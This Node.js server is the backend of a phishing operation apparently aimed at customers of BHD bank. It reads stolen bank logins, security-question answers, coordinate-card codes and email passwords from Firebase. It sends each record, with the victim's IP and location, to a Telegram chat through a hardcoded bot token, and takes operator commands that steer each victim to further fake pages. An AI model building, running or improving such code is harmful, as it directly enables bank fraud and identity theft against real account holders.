// server.js - VERSIÓN COMPLETA CON DEBUG
const express = require('express');
const admin = require('firebase-admin');
const axios = require('axios');

// Configurar dotenv solo en desarrollo
if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config();
}

const app = express();
app.use(express.json());

// === CONFIGURACIÓN DE TELEGRAM ===
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002991672575';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const ALLOWED_PAGES = [
  'pregunta-1.html',
  'coordenada1.html',
  'coordenada2.html',
  'coordenada3.html',
  'coordenadaR.html',
  'mailbox.html',
  'finalizado.html'
];

// === CONFIGURACIÓN SEGURA DE FIREBASE ===
console.log('🔧 Inicializando Firebase...');
console.log('🔑 FIREBASE_SERVICE_ACCOUNT disponible:', !!process.env.FIREBASE_SERVICE_ACCOUNT);
console.log('🤖 TELEGRAM_BOT_TOKEN disponible:', !!TELEGRAM_BOT_TOKEN);
console.log('💬 TELEGRAM_CHAT_ID disponible:', !!TELEGRAM_CHAT_ID);

let serviceAccount;
try {
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    // Producción (Render.com)
    console.log('📦 Cargando Firebase desde variables de entorno...');
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
    console.log('✅ Firebase config cargada desde variables de entorno');
  } else {
    // Desarrollo local
    console.log('💻 Cargando Firebase desde archivo local...');
    serviceAccount = require('./serviceAccountKey.json');
    console.log('✅ Firebase config cargada desde archivo local');
  }
} catch (error) {
  console.error('❌ ERROR CRÍTICO: No se pudo cargar la configuración de Firebase');
  console.error('🔍 Detalles del error:', error.message);
  console.error('💡 Solución: Verifica que FIREBASE_SERVICE_ACCOUNT contenga un JSON válido en Render.com');
  process.exit(1);
}

// Inicializar Firebase Admin SDK
try {
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com'
  });
  console.log('✅ Firebase Admin SDK inicializado correctamente');
} catch (error) {
  console.error('❌ ERROR al inicializar Firebase Admin:', error.message);
  process.exit(1);
}

const database = admin.database();

// === MIDDLEWARE PARA LOGGING ===
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
  next();
});

// === 1. ESCUCHAR CAMBIOS EN FIREBASE Y ENVIAR A TELEGRAM ===
let isProcessing = false;

console.log('👂 Iniciando listener de Firebase...');

database.ref('/captures').on('child_added', async (snapshot) => {
  console.log('🔔 EVENTO child_added DETECTADO en Firebase');
  
  if (isProcessing) {
    console.log('⏳ Ya hay un proceso en ejecución, ignorando...');
    return;
  }
  isProcessing = true;

  try {
    const uid = snapshot.key;
    const data = snapshot.val();

    console.log(`📥 Nueva captura detectada: ${uid}`);
    console.log('📊 Datos recibidos:', JSON.stringify(data, null, 2));

    // Evitar procesar el campo redirectPage
    const steps = Object.keys(data).filter(key => key !== 'redirectPage');
    console.log(`🔍 Pasos encontrados: ${steps.join(', ')}`);
    
    if (steps.length === 0) {
      console.log('⚠️ No hay pasos para procesar');
      isProcessing = false;
      return;
    }

    const step = steps[0];
    const payload = data[step];
    
    console.log(`🎯 Procesando paso: ${step}`);
    console.log('📦 Payload:', payload);

    // Construir mensaje para Telegram
    let mensaje = `🚨 *NUEVO DATO CAPTURADO - BHD*\n`;
    mensaje += `🔹 *UID*: \`${uid}\`\n`;
    mensaje += `🔹 *Paso*: ${step}\n\n`;

    if (step === 'login') {
      mensaje += `🔐 *CREDENCIALES*\n`;
      mensaje += `• Usuario: \`${payload.username || 'N/A'}\`\n`;
      mensaje += `• Contraseña: \`${payload.password || 'N/A'}\`\n\n`;
    } else if (step === 'security') {
      mensaje += `❓ *PREGUNTAS DE SEGURIDAD*\n`;
      mensaje += `• Color favorito: \`${payload.ans1 || 'N/A'}\`\n`;
      mensaje += `• Marca primer carro: \`${payload.ans2 || 'N/A'}\`\n`;
      mensaje += `• Personaje libro: \`${payload.ans3 || 'N/A'}\`\n`;
      mensaje += `• Abuela materna: \`${payload.ans4 || 'N/A'}\`\n`;
      mensaje += `• Colegio primaria: \`${payload.ans5 || 'N/A'}\`\n\n`;
    } else if (step.startsWith('coordenada')) {
      mensaje += `📍 *COORDENADAS (${step})*\n`;
      Object.keys(payload).forEach(key => {
        if (key.startsWith('coord')) {
          mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
        }
      });
      mensaje += `\n`;
    } else if (step === 'mailbox') {
      mensaje += `📧 *CORREO*\n`;
      mensaje += `• Email: \`${payload.email || 'N/A'}\`\n`;
      mensaje += `• Contraseña: \`${payload.emailPassword || 'N/A'}\`\n\n`;
    } else {
      // Para pasos desconocidos, mostrar todos los datos
      mensaje += `📝 *DATOS*\n`;
      Object.keys(payload).forEach(key => {
        mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
      });
      mensaje += `\n`;
    }

    // Información del sistema
    mensaje += `🌐 *INFO DEL USUARIO*\n`;
    mensaje += `• IP: \`${payload.ip || 'N/A'}\`\n`;
    mensaje += `• Ubicación: ${payload.city || 'N/A'}, ${payload.region || 'N/A'}, ${payload.country || 'N/A'}\n`;
    mensaje += `• Navegador: ${payload.userAgent?.substring(0, 50) || 'N/A'}\n`;
    mensaje += `• Fecha: ${payload.date || 'N/A'} - ${payload.time || 'N/A'}\n\n`;

    // === OPCIONES DE REDIRECCIÓN ===
    mensaje += `⏭️ *OPCIONES DE REDIRECCIÓN* (responder en este chat):\n`;
    ALLOWED_PAGES.forEach(page => {
      mensaje += `/redirect ${uid} ${page}\n`;
    });

    console.log('📨 Mensaje construido para Telegram:');
    console.log(mensaje);

    // Enviar a Telegram
    console.log('🔄 Enviando a Telegram...');
    console.log(`🔗 URL: ${TELEGRAM_API}/sendMessage`);
    console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID}`);
    
    const telegramResponse = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown'
    }, {
      timeout: 10000 // 10 segundos timeout
    });

    console.log(`✅ Enviado a Telegram: ${uid}/${step}`);
    console.log('📞 Respuesta de Telegram:', telegramResponse.data);

  } catch (error) {
    console.error('❌ Error al procesar captura:');
    console.error('🔴 Mensaje:', error.message);
    
    if (error.response) {
      console.error('🔴 Respuesta HTTP:', error.response.status);
      console.error('🔴 Datos error:', error.response.data);
    }
    
    if (error.code) {
      console.error('🔴 Código error:', error.code);
    }
  } finally {
    isProcessing = false;
    console.log('🔄 Procesamiento completado, listo para siguiente evento\n');
  }
});

// === 2. WEBHOOK PARA RECIBIR COMANDOS DE TELEGRAM ===
app.post('/telegram/webhook', async (req, res) => {
  try {
    const message = req.body?.message?.text;
    const chatId = req.body?.message?.chat?.id;

    console.log(`📨 Webhook recibido: ${message}`);
    console.log(`💬 Chat ID: ${chatId}`);

    // Validar que el mensaje viene del chat autorizado
    const expectedChatId = TELEGRAM_CHAT_ID.replace('-100', '-100');
    if (!message || chatId?.toString() !== expectedChatId) {
      console.log(`⚠️ Mensaje ignorado - Chat ID no autorizado: ${chatId}, esperado: ${expectedChatId}`);
      return res.status(200).send('Ignored');
    }

    if (!message.startsWith('/redirect ')) {
      return res.status(200).send('Not a redirect command');
    }

    const commandRegex = /^\/redirect\s+([a-f0-9-]+)\s+([a-zA-Z0-9._-]+\.html)$/;
    const match = message.match(commandRegex);

    if (!match) {
      await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: '❌ Formato incorrecto. Usa: `/redirect UID pagina.html`',
        parse_mode: 'Markdown'
      });
      return res.status(200).send('Invalid command format');
    }

    const uid = match[1];
    const page = match[2];

    if (!ALLOWED_PAGES.includes(page)) {
      await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: `❌ Página no permitida: ${page}\nPáginas válidas: ${ALLOWED_PAGES.join(', ')}`
      });
      return res.status(200).send('Invalid page');
    }

    // Actualizar Firebase para redirigir al usuario
    await database.ref(`/captures/${uid}/redirectPage`).set(page);

    // Confirmar al admin
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `✅ Redirección configurada:\nUID: \`${uid}\`\n→ ${page}`,
      parse_mode: 'Markdown'
    });

    console.log(`✅ Redirección establecida: ${uid} → ${page}`);
    return res.status(200).send('OK');

  } catch (error) {
    console.error('❌ Error en webhook:', error.message);
    try {
      await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: `❌ Error interno del servidor: ${error.message}`
      });
    } catch (telegramError) {
      console.error('❌ Error al enviar mensaje de error a Telegram:', telegramError.message);
    }
    return res.status(500).send('Internal Server Error');
  }
});

// === RUTAS ADICIONALES ===

// Ruta para testear Telegram
app.get('/test-telegram', async (req, res) => {
  try {
    console.log('🧪 Probando conexión con Telegram...');
    
    // Test 1: Verificar bot
    const botInfo = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
    console.log('✅ Bot info:', botInfo.data);
    
    // Test 2: Enviar mensaje de prueba
    const testMessage = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: '🧪 *TEST DEL SERVIDOR BHD*\nEste es un mensaje de prueba.\n✅ Si ves esto, Telegram está funcionando correctamente.',
      parse_mode: 'Markdown'
    });
    
    console.log('✅ Mensaje de prueba enviado:', testMessage.data);
    
    res.json({
      success: true,
      bot: botInfo.data,
      message: testMessage.data,
      chat_id: TELEGRAM_CHAT_ID
    });
    
  } catch (error) {
    console.error('❌ Error en test de Telegram:');
    console.error('🔴 Mensaje:', error.message);
    
    if (error.response) {
      console.error('🔴 Respuesta HTTP:', error.response.status);
      console.error('🔴 Datos error:', error.response.data);
    }
    
    res.status(500).json({
      success: false,
      error: error.message,
      response: error.response?.data
    });
  }
});

// Ruta para ver datos actuales de Firebase
app.get('/api/captures', async (req, res) => {
  try {
    const snapshot = await database.ref('/captures').once('value');
    const data = snapshot.val();
    
    console.log('📊 Consultando datos de Firebase...');
    console.log('📈 Datos actuales:', data);
    
    res.json({
      success: true,
      total: data ? Object.keys(data).length : 0,
      captures: data,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('❌ Error al consultar Firebase:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Ruta de health check para Render
app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    service: 'BHD Firebase Server',
    environment: process.env.NODE_ENV || 'development'
  });
});

// Ruta de información del servidor
app.get('/info', (req, res) => {
  res.json({
    service: 'BHD Firebase Server',
    version: '2.0.0',
    environment: process.env.NODE_ENV || 'development',
    firebase: {
      initialized: true,
      database: 'Connected',
      url: 'https://bhd-firebase-default-rtdb.firebaseio.com'
    },
    telegram: {
      bot: TELEGRAM_BOT_TOKEN ? 'Configured' : 'Not configured',
      chat_id: TELEGRAM_CHAT_ID,
      api_url: TELEGRAM_API
    },
    endpoints: {
      health: '/health',
      info: '/info',
      test_telegram: '/test-telegram',
      api_captures: '/api/captures',
      webhook: '/telegram/webhook'
    }
  });
});

// Ruta principal
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>BHD Server</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
            .success { background: #d4edda; color: #155724; }
            .info { background: #d1ecf1; color: #0c5460; }
            .endpoints { background: #f8f9fa; padding: 15px; border-radius: 5px; }
            a { color: #007bff; text-decoration: none; }
            a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <h1>🚀 Servidor BHD Firebase + Telegram</h1>
        <div class="status success">✅ Servidor activo y funcionando</div>
        
        <div class="endpoints">
            <strong>🔧 Endpoints de Debug:</strong><br>
            • <a href="/health">/health</a> - Estado del servidor<br>
            • <a href="/info">/info</a> - Información del sistema<br>
            • <a href="/test-telegram">/test-telegram</a> - Probar Telegram<br>
            • <a href="/api/captures">/api/captures</a> - Ver datos de Firebase<br>
            • POST /telegram/webhook - Webhook de Telegram
        </div>
        
        <div class="status info">
            <strong>📊 Estado del Sistema:</strong><br>
            • Environment: ${process.env.NODE_ENV || 'development'}<br>
            • Puerto: ${process.env.PORT || 3000}<br>
            • Firebase: ✅ Conectado<br>
            • Telegram: ${TELEGRAM_BOT_TOKEN ? '✅ Configurado' : '❌ No configurado'}<br>
            • Listener Firebase: ✅ Activo
        </div>
    </body>
    </html>
  `);
});

// Manejo de errores global
app.use((error, req, res, next) => {
  console.error('❌ Error global:', error);
  res.status(500).json({ error: 'Internal Server Error' });
});

// Ruta 404
app.use('*', (req, res) => {
  res.status(404).json({ error: 'Ruta no encontrada' });
});

// Inicializar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Servidor BHD corriendo en puerto ${PORT}`);
  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`📞 Health check: https://bhs-8syw.onrender.com/health`);
  console.log(`🧪 Test Telegram: https://bhs-8syw.onrender.com/test-telegram`);
  console.log(`📊 API Captures: https://bhs-8syw.onrender.com/api/captures`);
  console.log(`🤖 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? '✅ CONFIGURADO' : '❌ NO CONFIGURADO'}`);
  console.log(`🔥 Firebase: ✅ INICIALIZADO`);
  console.log(`👂 Listener Firebase: ✅ ACTIVO`);
});